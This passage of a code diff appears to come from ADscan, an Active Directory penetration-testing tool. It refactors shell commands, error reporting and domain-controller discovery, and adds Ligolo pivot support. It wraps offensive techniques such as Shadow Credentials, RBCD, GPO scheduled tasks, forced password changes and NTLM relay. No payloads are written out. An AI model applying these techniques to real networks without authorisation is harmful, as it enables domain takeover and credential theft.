     def exploit_gpo_rollback(self, ledger_id: str | None = None) -> bool:
         """Roll back a previously planted GPO Immediate Scheduled Task."""
         from adscan_internal.cli.gpo_abuse_handler import run_exploit_gpo_rollback
@@ -24431,15 +25034,38 @@ class PentestShell:
         run_enum_adcs_privs(self, domain=domain, username=username, password=password)
 
     def do_enum_adcs_privs(self, args):
-        """Wrapper for enum_adcs_privs command."""
-        from adscan_internal.cli.privileges import run_enum_adcs_privs
+        """Wrapper for enum_adcs_privs command.
 
-        args = args.split()
-        if len(args) != 3:
-            self.console.print("Usage: enum_adcs_privs <domain> <user> <password>")
+        Usage:
+            enum_adcs_privs <domain> <user> <password>
+            enum_adcs_privs -d <domain> -u <user> -p <password>
+
+        Both forms are permanently supported. In the flag form, a secret
+        value starting with "-" needs the "=" spelling: --password=-Str0ngP@ss!
+        """
+        from adscan_internal.cli.privileges import run_enum_adcs_privs
+        from adscan_internal.cli.repl_args import ReplArgumentParser, parse_command_args
+
+        usage = "enum_adcs_privs <domain> <user> <password>  |  enum_adcs_privs -d <domain> -u <user> -p <password>"
+        parser = ReplArgumentParser(prog="enum_adcs_privs", add_help=False)
+        parser.add_argument("-d", "--domain", required=True)
+        parser.add_argument("-u", "--username", required=True)
+        parser.add_argument("-p", "--password", required=True)
+
+        namespace = parse_command_args(
+            tokens_source=args,
+            legacy_field_order=("domain", "username", "password"),
+            parser=parser,
+            usage=usage,
+        )
+        if namespace is None:
             return
-        domain, username, password = args
-        run_enum_adcs_privs(self, domain=domain, username=username, password=password)
+        run_enum_adcs_privs(
+            self,
+            domain=namespace.domain,
+            username=namespace.username,
+            password=namespace.password,
+        )
 
     def ask_for_adcs_esc(self, domain, esc, username, password, template=None):
         """Asks if you want to exploit a specific ESC vulnerability."""
@@ -24761,6 +25387,7 @@ class PentestShell:
                     resolved_domain = ".".join(dc_parts).lower()
             except Exception as exc:  # pragma: no cover - defensive
                 telemetry.capture_exception(exc)
+                print_exception(exception=exc)
                 resolved_domain = None
 
         if not resolved_domain:
@@ -24912,8 +25539,14 @@ class PentestShell:
         *,
         prompt_for_user_privs_after: bool = True,
         prompt_for_method_choice: bool = True,
+        forced_method: str | None = None,
     ) -> bool:
-        """Exploit a computer object through Shadow Credentials or RBCD."""
+        """Exploit a computer object through Shadow Credentials or RBCD.
+
+        ``forced_method`` pins the technique (``"shadow"``/``"rbcd"``), skipping
+        the menu — for ACL edges that grant only one primitive (e.g.
+        AddKeyCredentialLink → shadow-creds only).
+        """
         from adscan_internal.cli.exploits import run_exploit_control_computer_object
 
         return run_exploit_control_computer_object(
@@ -24925,6 +25558,7 @@ class PentestShell:
             target_domain=target_domain,
             prompt_for_user_privs_after=prompt_for_user_privs_after,
             prompt_for_method_choice=prompt_for_method_choice,
+            forced_method=forced_method,
         )
 
     def exploit_write_spn(
@@ -25023,6 +25657,7 @@ class PentestShell:
                             )
                     except Exception as exc:
                         telemetry.capture_exception(exc)
+                        print_exception(exception=exc)
                 if getattr(result, "cleanup_success", None) is False:
                     print_warning(
                         "Shadow Credentials cleanup did not complete automatically. "
@@ -25176,6 +25811,7 @@ class PentestShell:
                         result = native_result
                 except Exception as exc_native:  # noqa: BLE001
                     telemetry.capture_exception(exc_native)
+                    print_exception(exception=exc_native)
                     print_info_debug(
                         f"[ptc] Native PTC raised "
                         f"{type(exc_native).__name__}: {exc_native}."
@@ -25536,6 +26172,7 @@ class PentestShell:
         target_domain,
         *,
         prompt_for_user_privs_after: bool = True,
+        target_kind: str | None = None,
     ) -> bool:
         """Wrapper for exploit_force_change_password operation."""
         from adscan_internal.cli.exploits import run_exploit_force_change_password
@@ -25548,6 +26185,7 @@ class PentestShell:
             target_user=target_user,
             target_domain=target_domain,
             prompt_for_user_privs_after=prompt_for_user_privs_after,
+            target_kind=target_kind,
         )
 
     def _infer_service_command_target_count(self, command: str) -> int:
@@ -25744,6 +26382,7 @@ class PentestShell:
 
             except subprocess.TimeoutExpired as e:
                 telemetry.capture_exception(e)
+                print_exception(exception=e)
                 # Timeout occurred as per subprocess.run's own mechanism
 
                 print_error(
@@ -25840,6 +26479,7 @@ class PentestShell:
                                         )
                                 except Exception as exc:  # noqa: BLE001
                                     telemetry.capture_exception(exc)
+                                    print_exception(exception=exc)
 
                     if confirmed_findings:
                         render_service_access_results(
@@ -25871,6 +26511,7 @@ class PentestShell:
                             )
                         except Exception as exc:  # noqa: BLE001
                             telemetry.capture_exception(exc)
+                            print_exception(exception=exc)
                             print_info_debug(
                                 f"[service-access] failed to persist probe history: {exc}"
                             )
@@ -25989,6 +26630,7 @@ class PentestShell:
                             )
                         except Exception as exc:  # noqa: BLE001
                             telemetry.capture_exception(exc)
+                            print_exception(exception=exc)
                             print_info_debug(
                                 f"[service-access] failed to persist probe history: {exc}"
                             )
@@ -25998,6 +26640,7 @@ class PentestShell:
 
             except subprocess.TimeoutExpired as e:
                 telemetry.capture_exception(e)
+                print_exception(exception=e)
 
                 print_error(
                     f"Timeout during attempt {attempt + 1} of {max_retries} for service {service}"
@@ -26013,6 +26656,7 @@ class PentestShell:
 
             except subprocess.CalledProcessError as e:
                 telemetry.capture_exception(e)
+                print_exception(exception=e)
                 if "[ADSCAN] NETEXEC_COMMAND_TIMEOUT" in str(e.stderr or ""):
                     marked_service = mark_sensitive(service, "text")
                     print_warning(
@@ -26047,15 +26691,18 @@ class PentestShell:
 
         _ask_for_ldap_users(self, target_domain)
 
-    def do_netexec_ldap_users(self, target_domain):
+    def do_ldap_active_users(self, target_domain):
+        """List active (enabled, non-stale) domain users via a native LDAP query."""
         from adscan_internal.cli.ldap import run_ldap_active_users
 
+        target_domain = resolve_repl_domain_or_default(self, target_domain) or ""
         return run_ldap_active_users(self, target_domain)
 
     def do_identity_inventory(self, target_domain):
         """Populate enabled identity inventory from the local attack graph."""
         from adscan_internal.cli.intelligence import run_identity_inventory
 
+        target_domain = resolve_repl_domain_or_default(self, target_domain) or ""
         run_identity_inventory(self, target_domain)
 
     def ask_for_users(self, target_domain):
@@ -26068,12 +26715,14 @@ class PentestShell:
         """Wrapper for run_users - maintains compatibility."""
         from adscan_internal.cli.attack_graph_reports import run_users
 
+        target_domain = resolve_repl_domain_or_default(self, target_domain) or ""
         run_users(self, target_domain)
 
     def do_all_users(self, target_domain):
         """Wrapper for run_all_users - maintains compatibility."""
         from adscan_internal.cli.attack_graph_reports import run_all_users
 
+        target_domain = resolve_repl_domain_or_default(self, target_domain) or ""
         run_all_users(self, target_domain)
 
     def do_admin_users(self, target_domain):
@@ -26082,6 +26731,7 @@ class PentestShell:
             run_control_exposure_identities,
         )
 
+        target_domain = resolve_repl_domain_or_default(self, target_domain) or ""
         run_control_exposure_identities(self, target_domain)
 
     def do_privileged_users(self, target_domain):
@@ -26090,6 +26740,7 @@ class PentestShell:
             run_domain_compromise_enablers,
         )
 
+        target_domain = resolve_repl_domain_or_default(self, target_domain) or ""
         run_domain_compromise_enablers(self, target_domain)
 
     def do_paths_inspect(self, args):
@@ -26161,6 +26812,7 @@ class PentestShell:
             )
         except Exception as exc:  # noqa: BLE001 — telemetry sink
             telemetry.capture_exception(exc)
+            print_exception(exception=exc)
             print_error(f"Failed to load attack paths: {exc}")
             return
 
@@ -26250,6 +26902,7 @@ class PentestShell:
             )
         except Exception as exc:  # noqa: BLE001 — telemetry sink
             telemetry.capture_exception(exc)
+            print_exception(exception=exc)
             print_error(f"Failed to load attack paths: {exc}")
             return
 
@@ -26266,6 +26919,7 @@ class PentestShell:
             )
         except Exception as exc:  # noqa: BLE001 — telemetry sink
             telemetry.capture_exception(exc)
+            print_exception(exception=exc)
             print_error(f"paths_execute failed: {exc}")
 
     def do_attack_path_discovery(self, args):
@@ -26326,9 +26980,10 @@ class PentestShell:
             --tier0-only: Restrict paths to Tier-0 targets only
             --all: Include paths whose target is not high value
             --lowpriv: Show only paths to non-high-value targets (pivot/lateral-movement opportunities)
-            --keep-longest: Domain scope only. By default the domain listing shows the
-                most direct route to domain compromise; with this flag it shows the
-                full holistic kill chain instead.
+            --keep-shortest: Domain scope only. The domain listing now shows the full
+                holistic kill chain by default (all distinct entry points, with the
+                broadest-reach and PROVEN paths preserved). This opt-out reverts to the
+                legacy most-direct-route view. (--keep-longest is retained as a no-op.)
 
         Examples:
             attack_paths north.sevenkingdoms.local
@@ -26367,7 +27022,7 @@ class PentestShell:
         lowpriv = False
         target_mode = "object"
         no_cache = False
-        keep_longest = False
+        keep_longest = True
 
         # Parse flags first: --max N, --depth N (and remove them from positional parsing).
         positionals: list[str] = []
@@ -26438,7 +27093,15 @@ class PentestShell:
                 i += 1
                 continue
             if token in {"--keep-longest", "--keep_longest"}:
+                # Default is now keep_longest; the flag is retained as a harmless
+                # no-op for backwards compatibility.
                 keep_longest = True
+                i += 1
+                continue
+            if token in {"--keep-shortest", "--keep_shortest"}:
+                # Opt-out: the legacy most-direct-route view (drops distinct entry
+                # points / a longer PROVEN chain — kept for debugging/comparison).
+                keep_longest = False
                 i += 1
                 continue
             positionals.append(token)
@@ -26707,12 +27370,14 @@ class PentestShell:
         """
         from adscan_internal.cli.ldap import run_ldap_computers
 
+        target_domain = resolve_repl_domain_or_default(self, target_domain) or ""
         return run_ldap_computers(self, target_domain)
 
     def do_host_inventory(self, target_domain):
         """Populate enabled host inventory from the local attack graph."""
         from adscan_internal.cli.intelligence import run_host_inventory
 
+        target_domain = resolve_repl_domain_or_default(self, target_domain) or ""
         run_host_inventory(self, target_domain)
 
     def ask_for_computers(self, target_domain):
@@ -26730,6 +27395,7 @@ class PentestShell:
         """Wrapper for run_sessions - maintains compatibility."""
         from adscan_internal.cli.attack_graph_reports import run_sessions
 
+        target_domain = resolve_repl_domain_or_default(self, target_domain) or ""
         run_sessions(self, target_domain)
 
     def execute_sessions(
@@ -26744,23 +27410,26 @@ class PentestShell:
         """Wrapper for run_computers_all - maintains compatibility."""
         from adscan_internal.cli.attack_graph_reports import run_computers_all
 
+        target_domain = resolve_repl_domain_or_default(self, target_domain) or ""
         run_computers_all(self, target_domain)
 
     def do_computers_with_laps(self, target_domain):
         """Wrapper for run_computers_with_laps - maintains compatibility."""
         from adscan_internal.cli.attack_graph_reports import run_computers_with_laps
 
+        target_domain = resolve_repl_domain_or_default(self, target_domain) or ""
         run_computers_with_laps(self, target_domain)
 
     def do_computers_without_laps(self, target_domain):
         """Wrapper for run_computers_without_laps - maintains compatibility."""
         from adscan_internal.cli.attack_graph_reports import run_computers_without_laps
 
+        target_domain = resolve_repl_domain_or_default(self, target_domain) or ""
         run_computers_without_laps(self, target_domain)
 
-    def do_netexec_smb_null_enum_users(self, domain):
+    def do_smb_null_enum_users(self, domain):
         """
-        Creates a user list for the specified domain using null SMB.
+        Creates a user list for the specified domain using a native SMB null-session SAMR enumeration.
 
         Args:
             domain (str): The domain for which to enumerate users.
@@ -26770,12 +27439,14 @@ class PentestShell:
         """
         from adscan_internal.cli.smb import run_smb_null_enum_users
 
+        domain = resolve_repl_domain_or_default(self, domain) or ""
         run_smb_null_enum_users(self, domain=domain)
 
     def do_kerberos_enum_users(self, domain):
         """Enumerate users of the specified domain using Kerberos."""
         from adscan_internal.cli.ldap import run_kerberos_enum_users
 
+        domain = resolve_repl_domain_or_default(self, domain) or ""
         run_kerberos_enum_users(self, domain)
 
     def execute_kerberos_enum_users(self, command, domain, initial_count, users_file):
@@ -27016,6 +27687,7 @@ class PentestShell:
 
         except Exception as e:
             telemetry.capture_exception(e)
+            print_exception(exception=e)
             marked_domain = mark_sensitive(domain, "domain")
             print_warning(f"Error updating unified krb5.conf for {marked_domain}: {e}")
 
@@ -27589,6 +28261,7 @@ class PentestShell:
         """
         from adscan_internal.cli.dns import extract_netbios_name
 
+        domain = resolve_repl_domain_or_default(self, domain) or ""
         return extract_netbios_name(self, domain)
 
     def monitor_smb(self, proc, domain):
@@ -27714,11 +28387,25 @@ class PentestShell:
             domain_info = {}
 
         if is_domain_best_effort_mode(self, normalized_domain):
-            fallback_pdc_ip = pdc_ip or domains_data_pdc or getattr(self, "pdc", None)
+            # NOTE: deliberately does NOT fall back to getattr(self, "pdc", None) --
+            # that shell attribute is shared across domains (not scoped per
+            # domain) and would leak a different, previously-processed
+            # domain's PDC into this one (the same cross-domain contamination
+            # class fixed below for the do_check_dns-failure branch). Only
+            # sources that are provably scoped to THIS domain are used: the
+            # caller-supplied pdc_ip, or a PDC already recorded for this
+            # domain in domains_data.
+            fallback_pdc_ip = pdc_ip or domains_data_pdc
             if not fallback_pdc_ip:
                 print_warning_debug(
                     f"[dns_find_dcs] Best-effort domain {marked_domain} has no PDC IP; aborting DC discovery"
                 )
+                # Same rationale as the do_check_dns-failure branch above:
+                # clear rather than leave a possibly-stale, different
+                # domain's self.pdc/self.dcs in place for the caller to read.
+                self.dcs = []
+                self.pdc = None
+                self.pdc_hostname = None
                 return
 
             hostname_hint = domain_info.get("pdc_hostname")
@@ -27791,6 +28478,25 @@ class PentestShell:
             print_warning_debug(
                 f"[dns_find_dcs] DNS check failed for domain {marked_domain}, aborting DC discovery"
             )
+            # self.pdc/self.dcs/self.pdc_hostname are single shared shell
+            # attributes, NOT scoped per domain. If we returned here without
+            # touching them, they would still hold whatever a PREVIOUSLY
+            # processed domain left behind (e.g. an auth_domain's PDC while
+            # enumerating a cross-forest target_domain reached via trust) and
+            # the caller (create_sub_workspace_for_domain) blindly persists
+            # self.pdc as authoritative for THIS domain right after this call
+            # returns. When the caller supplied a pdc_ip for this domain,
+            # trust it -- it is always more correct than a stale
+            # foreign-domain value. Otherwise, clear to the class defaults
+            # (None/[]) rather than silently leak a different domain's PDC.
+            if pdc_ip:
+                self.dcs = [pdc_ip]
+                self.pdc = pdc_ip
+                self.pdc_hostname = None
+            else:
+                self.dcs = []
+                self.pdc = None
+                self.pdc_hostname = None
             return
 
         preferred_ips = [pdc_ip, domains_data_pdc, getattr(self, "pdc", None)]
@@ -27899,6 +28605,14 @@ class PentestShell:
                     )
                 self.add_to_hosts(domain)
             else:
+                # No SRV-discovered DCs and no pdc_ip fallback for this
+                # domain. self.dcs is already [] from `self.dcs = dc_ips`
+                # above; clear self.pdc/self.pdc_hostname too so a stale,
+                # different domain's PDC (from a prior call in this same
+                # shell session) is never misread as belonging to THIS
+                # domain by a caller that reads self.pdc right after return.
+                self.pdc = None
+                self.pdc_hostname = None
                 print_info_verbose(f"DCs for domain {marked_domain} found: {self.dcs}")
         else:
             # If there is more than one DC, specifically search for the PDC
@@ -28213,6 +28927,7 @@ class PentestShell:
             return bool(result and result.returncode == 0)
         except Exception as exc:
             telemetry.capture_exception(exc)
+            print_exception(exception=exc)
             return False
 
     def _write_system_file(self, path: str, content: str, *, mode: int = 0o644) -> bool:
@@ -28319,6 +29034,7 @@ class PentestShell:
             return bool(result and result.returncode == 0)
         except Exception as exc:
             telemetry.capture_exception(exc)
+            print_exception(exception=exc)
             return False
 
     def _remove_system_file(self, path: str) -> bool:
@@ -28338,6 +29054,7 @@ class PentestShell:
             return bool(result and result.returncode == 0)
         except Exception as exc:
             telemetry.capture_exception(exc)
+            print_exception(exception=exc)
             return False
 
     def _ensure_unbound_available(self) -> bool:
@@ -28496,6 +29213,7 @@ class PentestShell:
                     self._restart_unbound()
             except Exception as exc:
                 telemetry.capture_exception(exc)
+                print_exception(exception=exc)
                 print_info_debug("[dns] Failed to probe local port 53 listeners.")
 
             dns_service = self._get_dns_discovery_service()
@@ -28558,6 +29276,7 @@ class PentestShell:
                             return True
                 except Exception as exc:
                     telemetry.capture_exception(exc)
+                    print_exception(exception=exc)
 
             print_error(f"DNS resolution failed for {marked_domain}")
             return False
@@ -28718,6 +29437,9 @@ class PentestShell:
         # picker can annotate each option and avoid the no-IP dead-end.
         try:
             from adscan_internal.cli.start import _list_local_interfaces_with_ipv4
+            from adscan_internal.services.pivot_runtime_state_service import (
+                is_ligolo_interface,
+            )
 
             annotated = _list_local_interfaces_with_ipv4()
 
@@ -28766,6 +29488,16 @@ class PentestShell:
                     )
                     return True
 
+                # A Ligolo TUN legitimately has no normal source IPv4 — it is an
+                # L3 routing vantage, not a dead-end. Accept it instead of looping
+                # forever: outbound enumeration / relay-as-client work over the
+                # tunnel, and inbound-callback IPs are resolved per-target by the
+                # egress resolver (see services/egress_resolver.py).
+                if is_ligolo_interface(selected_iface):
+                    self.interface = selected_iface
+                    self._render_pivot_vantage_panel(selected_iface)
+                    return True
+
                 # No usable IPv4 on the chosen interface.
                 self.interface = None
                 if noninteractive:
@@ -28799,9 +29531,42 @@ class PentestShell:
                     f"Interface configured: {self.interface} with IP: {self.myip}"
                 )
                 return True
-            else:
-                print_error(f"Could not get IP for interface {self.interface}")
-                return False
+            from adscan_internal.services.pivot_runtime_state_service import (
+                is_ligolo_interface,
+            )
+
+            if is_ligolo_interface(iface_input):
+                self.interface = iface_input
+                self._render_pivot_vantage_panel(iface_input)
+                return True
+            print_error(f"Could not get IP for interface {self.interface}")
+            return False
+
+    def _render_pivot_vantage_panel(self, interface: str) -> None:
+        """Render the honest capability panel for an accepted Ligolo TUN vantage.
+
+        A Ligolo TUN is an L3 routing tunnel with no normal source IPv4. It is a
+        legitimate scanning vantage for outbound-initiated work, but inbound
+        callbacks and broadcast poisoning have real limits the operator must
+        know before relying on them.
+        """
+        from adscan_internal import print_panel  # noqa: PLC0415
+
+        print_panel(
+            "[bold]Ligolo TUN accepted as an L3 routing vantage.[/bold]\n\n"
+            "[green][+][/green] Outbound enumeration and relay-as-client work "
+            "over the tunnel (host discovery, LDAP/SMB/Kerberos, kerberoast, "
+            "AS-REP, DCSync).\n"
+            "[yellow][~][/yellow] Inbound NTLM capture (write-share bait, relay "
+            "server, coercion-to-us, PrintNightmare) needs a target-segment "
+            "redirector — the callback IP is resolved per-target and a plant is "
+            "honestly skipped where no reachable callback exists.\n"
+            "[red][-][/red] Broadcast poisoning (LLMNR/NBT-NS/mDNS) is "
+            "unavailable over an L3 tunnel — it carries no L2 broadcast traffic.",
+            title=f"[bold]Pivot vantage[/bold] · {interface}",
+            title_align="left",
+            border_style="cyan",
+        )
 
     def _prompt_auto_if_missing(self):
         """Interactively prompt for auto mode if not configured."""
@@ -29437,6 +30202,7 @@ class PentestShell:
                     mod_time_str = mod_time_dt.strftime("%Y-%m-%d %H:%M:%S")
                 except OSError as e:
                     telemetry.capture_exception(e)
+                    print_exception(exception=e)
                     # Could happen for broken symlinks, etc.
                     size_bytes = "N/A"
                     mod_time_str = "N/A"
@@ -29461,6 +30227,7 @@ class PentestShell:
                         name += f"-> {link_target}"
                     except OSError as e:
                         telemetry.capture_exception(e)
+                        print_exception(exception=e)
                         name += " -> [broken link]"
 
                 display_size = (
@@ -29478,9 +30245,11 @@ class PentestShell:
 
         except FileNotFoundError as e:
             telemetry.capture_exception(e)
+            print_exception(exception=e)
             print_error(f"ls: cannot access '{path_arg}': No such file or directory")
         except PermissionError as e:
             telemetry.capture_exception(e)
+            print_exception(exception=e)
             print_error(f"ls: cannot open directory '{path_arg}': Permission denied")
         except Exception as e:
             telemetry.capture_exception(e)
@@ -29730,6 +30499,7 @@ class PentestShell:
             execute_acl_cleanup(self)
         except Exception as exc:  # pragma: no cover - best-effort shutdown
             telemetry.capture_exception(exc)
+            print_exception(exception=exc)
             print_info_debug(f"[acl-cleanup] shutdown cleanup failed: {exc}")
         try:
             from adscan_internal.services.ligolo_artifact_cleanup_service import (
@@ -29739,6 +30509,7 @@ class PentestShell:
             cleanup_workspace_ligolo_artifacts(self, reason="adscan_exit")
         except Exception as exc:  # pragma: no cover - best-effort shutdown
             telemetry.capture_exception(exc)
+            print_exception(exception=exc)
             print_info_debug(f"[ligolo-cleanup] shutdown cleanup failed: {exc}")
         # Durable operator_confirmed changes (machine accounts, RBCD grants,
         # KeyCredentialLink) are NOT auto-reverted. Prompt the operator whether
@@ -29752,6 +30523,7 @@ class PentestShell:
             run_operator_confirmed_exit_cleanup(self)
         except Exception as exc:  # pragma: no cover - best-effort shutdown
             telemetry.capture_exception(exc)
+            print_exception(exception=exc)
             print_info_debug(f"[ledger] operator-confirmed exit cleanup failed: {exc}")
         # Finalise the ledger FIRST so the session-died reconciliation
         # force-transitions any non-terminal record (pending / revert_in_progress
@@ -29770,6 +30542,7 @@ class PentestShell:
                 render_cleanup_exit_panel(self.environment_change_ledger)
         except Exception as exc:
             telemetry.capture_exception(exc)
+            print_exception(exception=exc)
             print_info_debug(f"[ledger] exit panel failed: {exc}")
 
         # Session-death guarantee for background jobs: force any still-running
@@ -29780,6 +30553,7 @@ class PentestShell:
                 background_jobs.finalize()
         except Exception as exc:  # noqa: BLE001
             telemetry.capture_exception(exc)
+            print_exception(exception=exc)
         # Use telemetry console for session recording export. This console
         # records a superset of what the user sees in the terminal and is
         # only used for sanitized session uploads.
@@ -29804,6 +30578,7 @@ class PentestShell:
                         _json.dump(_report, _f, indent=2)
         except Exception as exc:
             telemetry.capture_exception(exc)
+            print_exception(exception=exc)
             print_info_debug(f"[ledger] failed to attach to technical_report: {exc}")
         print_info("Workspace saved.")
         # Context-aware exit: summary → single primary ask → report CTA.
@@ -29841,6 +30616,7 @@ class PentestShell:
                 self._finalise_telemetry_streamer()
             except Exception as exc:  # noqa: BLE001
                 telemetry.capture_exception(exc)
+                print_exception(exception=exc)
                 print_info_debug(
                     f"(telemetry-streamer) finalise hook in do_exit failed: "
                     f"{type(exc).__name__}: {exc}"
@@ -29923,30 +30699,18 @@ class PentestShell:
 
         handle_export(self, args)
 
-    def do_help(self, arg):
-        """
-        Displays help organized by categories.
+    def _build_help_tree(self):
+        """Build the command-category → verbs mapping and category descriptions.
 
-        Usage:
-        help         -> Displays all categories and their descriptions.
-        help <cat>   -> Displays the commands of the <cat> category and their descriptions.
-        help <cmd>   -> Displays the specific help for the <cmd> command (if defined).
-        """
-        # Capture help_requested telemetry (Hormozi: help seeking = engagement signal)
-        if (
-            hasattr(self, "_session_start_time")
-            and self._session_start_time is not None
-        ):
-            session_age_minutes = max(
-                0.0, (time.monotonic() - self._session_start_time) / 60.0
-            )
-            help_properties = {
-                "command": arg.strip().lower() if arg.strip() else "general",
-                "session_age_minutes": round(session_age_minutes, 2),
-                "commands_run_count": getattr(self, "_session_commands_count", 0),
-            }
-            telemetry.capture("help_requested", help_properties)
+        Single source of truth for command categories. Shared by ``do_help``
+        (renders the categories table) and the unknown-command recovery branch
+        (hints when an operator types a bare category name as if it were a
+        command). Reuse this instead of duplicating the category list.
 
+        Returns:
+            A ``(help_tree, category_descriptions)`` tuple where ``help_tree``
+            maps a category display name to its list of command verbs.
+        """
         # Updated help tree, with commands (without the "do_" prefix) and their categories.
         help_tree = {
             "General": ["set", "info", "start_unauth", "start_auth"],
@@ -29962,18 +30726,18 @@ class PentestShell:
             "SMB": [
                 "smb_scan",
                 "rid_cycling",
-                "netexec_gpp_autologin",
-                "netexec_gpp_passwords",
-                "netexec_guest",
-                "netexec_auth_shares",
-                "netexec_smb_null_enum_users",
+                "gpp_autologin",
+                "gpp_passwords",
+                "smb_guest_shares",
+                "smb_auth_shares",
+                "smb_null_enum_users",
                 "open_smb",
-                "netexec_smb_descriptions",
+                "smb_user_descriptions",
                 "generate_relay_list",
             ],
             "LDAP": [
                 "ldap_anonymous",
-                "netexec_ldap_users",
+                "ldap_active_users",
                 "ldap_computers",
             ],
             "Kerberos": [
@@ -30013,11 +30777,11 @@ class PentestShell:
                 "secretsdump_registries",
                 "dump_host",
             ],
-            "Spraying": ["spraying", "netexec_pass_policy"],
+            "Spraying": ["spraying", "password_policy"],
             "Cracking": ["cracking", "benchmark"],
             "Privileges": [
                 "enum_all_user_postauth_access",
-                "netexec_user_postauth_access",
+                "user_postauth_access",
             ],
             "BloodHound": [
                 "graph_collection",
@@ -30121,6 +30885,36 @@ class PentestShell:
         except Exception:  # noqa: BLE001 — never break help on registry import
             pass
 
+        return help_tree, category_descriptions
+
+    def do_help(self, arg):
+        """
+        Displays help organized by categories.
+
+        Usage:
+        help         -> Displays all categories and their descriptions.
+        help <cat>   -> Displays the commands of the <cat> category and their descriptions.
+        help <cmd>   -> Displays the specific help for the <cmd> command (if defined).
+        """
+        # Capture help_requested telemetry (Hormozi: help seeking = engagement signal)
+        if (
+            hasattr(self, "_session_start_time")
+            and self._session_start_time is not None
+        ):
+            session_age_minutes = max(
+                0.0, (time.monotonic() - self._session_start_time) / 60.0
+            )
+            help_properties = {
+                "command": arg.strip().lower() if arg.strip() else "general",
+                "session_age_minutes": round(session_age_minutes, 2),
+                "commands_run_count": getattr(self, "_session_commands_count", 0),
+            }
+            telemetry.capture("help_requested", help_properties)
+
+        # Category → verbs mapping (SSOT: also consumed by the unknown-command
+        # recovery branch so a bare category name gets a targeted hint).
+        help_tree, category_descriptions = self._build_help_tree()
+
         # If no argument is provided, display the categories and their descriptions.
         if not arg:
             table = Table(title="Available Command Categories")
@@ -30200,6 +30994,7 @@ except Exception as _shell_cmd_bind_exc:  # noqa: BLE001 — non-fatal
     try:
         from adscan_core import telemetry as _shell_cmd_bind_telemetry
         _shell_cmd_bind_telemetry.capture_exception(_shell_cmd_bind_exc)
+        print_exception(exception=_shell_cmd_bind_exc)
     except Exception:
         pass
 
@@ -30956,134 +31751,20 @@ def handle_doctor(args):
     )
 
 
-if __name__ == "__main__":
-    # Required for multiprocessing with spawn context inside a PyInstaller binary.
-    # Must be called before any other code in the __main__ block.
-    import multiprocessing
+def add_ci_subparser(subparsers):
+    """Register the container ``ci`` subparser (autonomous scan mode).
 
-    multiprocessing.freeze_support()
+    Module-level and importable (like ``add_execute_subparser`` /
+    ``add_demo_subparser``) so the launcher pass-through SSOT
+    (``adscan_core.cli_passthrough_spec``) can be locked against the real flag
+    surface by a contract test without executing the ``__main__`` block.
 
-    init_sentry()
-    _cleanup_legacy_adscan_sudo_alias()
-    # ADscan can be run as a normal user. Commands that require privileges will
-    # either request sudo when needed or (for install) re-exec via sudo with a
-    # minimal preserved environment.
+    Args:
+        subparsers: The result of ``parser.add_subparsers(...)`` to attach to.
 
-    FULL_VERSION = get_version()
-    parser = argparse.ArgumentParser(
-        description="ADscan: Active Directory Pentesting Tool.",
-        formatter_class=argparse.RawTextHelpFormatter,  # Allows for newlines in help text
-    )
-    # Global --version option (e.g. `adscan --version`)
-    parser.add_argument(
-        "--version",
-        action="store_true",
-        help="Show ADscan version and exit.",
-    )
-    # Global --output mode — propagates to adscan_core.output via
-    # ADSCAN_OUTPUT_MODE so structured consumers (adscan_web, agents)
-    # parse the canonical JSON envelope from docs/cli_style.md §2.
-    parser.add_argument(
-        "--output",
-        choices=["human", "json", "quiet"],
-        default=None,
-        help=(
-            "Output mode. 'human' (default) renders Rich panels/tables; "
-            "'json' emits one JSON envelope per operation to stdout; "
-            "'quiet' suppresses everything except the final JSON envelope."
-        ),
-    )
-    # subparsers = parser.add_subparsers(dest="command", help="Available commands. If no command is given, 'start' is assumed if the environment is set up.", required=False)
-    # ``metavar="command"`` keeps the usage synopsis to ``adscan ... command``
-    # (follows the convention used by `git`, `gh`, `docker`) so subcommands
-    # we want to hide (e.g. the work-in-progress ``tui``) don't leak into
-    # the curly-brace choices list at the top of ``--help``.
-    subparsers = parser.add_subparsers(
-        dest="command",
-        title="commands",
-        description="Run 'adscan <command> -h' for more information on a specific command.",
-        help="Available subcommands",
-        metavar="command",
-    )
-
-    install_parser = subparsers.add_parser(
-        "install", help="Install ADscan and its dependencies."
-    )
-    install_parser.add_argument(
-        "--only",
-        choices=["bloodhound", "rusthound", "pyenv"],
-        nargs="+",
-        help="Install only specific components (for QA testing). Use: --only bloodhound rusthound pyenv",
-    )
-    install_parser.add_argument(
-        "--dev",
-        action="store_true",
-        help=argparse.SUPPRESS,
-    )
-    install_parser.add_argument(
-        "--allow-low-disk",
-        action="store_true",
-        help="Continue installation even if free disk space is below 15GB (not recommended).",
-    )
-    install_parser.add_argument(
-        "--pull-timeout",
-        dest="pull_timeout",
-        type=int,
-        default=None,
-        help=(
-            "Docker pull timeout in seconds (default: 3600). "
-            "Set to 0 to disable the timeout."
-        ),
-    )
-    install_parser.add_argument(
-        "-v",
-        "--verbose",
-        action="store_true",
-        help="Enable verbose mode for detailed informational output.",
-    )
-    install_parser.add_argument(
-        "-d",
-        "--debug",
-        action="store_true",
-        help="Enable debug mode.",
-    )
-    start_parser = subparsers.add_parser(
-        "start", help="Start the ADscan interactive shell."
-    )
-    start_parser.add_argument(
-        "-v",
-        "--verbose",
-        action="store_true",
-        help="Enable verbose mode for detailed informational output.",
-    )
-    start_parser.add_argument(
-        "--dev",
-        action="store_true",
-        help=argparse.SUPPRESS,
-    )
-    start_parser.add_argument(
-        "-d",
-        "--debug",
-        action="store_true",
-        help="Enable debug mode.",
-    )
-    start_parser.add_argument(
-        "--tui",
-        action="store_true",
-        help="Launch the Textual-based TUI instead of the default prompt_toolkit shell.",
-    )
-    start_parser.add_argument(
-        "--show-structural",
-        action="store_true",
-        dest="show_structural",
-        help=(
-            "Show the STRUCTURAL band in the Tactical Findings panel "
-            "(INFO-severity edges that are part of the expected AD "
-            "hierarchy — Domain Admins, Enterprise Admins, DCs, SYSTEM). "
-            "Hidden by default to keep the panel focused on choke points."
-        ),
-    )
-    # Non-interactive CI scan for automated testing
+    Returns:
+        The configured ``ci`` subparser.
+    """
     ci_parser = subparsers.add_parser(
         "ci",
         help="[EXPERIMENTAL] Run ADscan in autonomous mode (skips all prompts, applies defaults)",
@@ -31218,6 +31899,140 @@ if __name__ == "__main__":
         default=None,
         help="Client-facing name shown on the report cover (e.g. the web workspace name).",
     )
+    return ci_parser
+
+
+if __name__ == "__main__":
+    # Required for multiprocessing with spawn context inside a PyInstaller binary.
+    # Must be called before any other code in the __main__ block.
+    import multiprocessing
+
+    multiprocessing.freeze_support()
+
+    init_sentry()
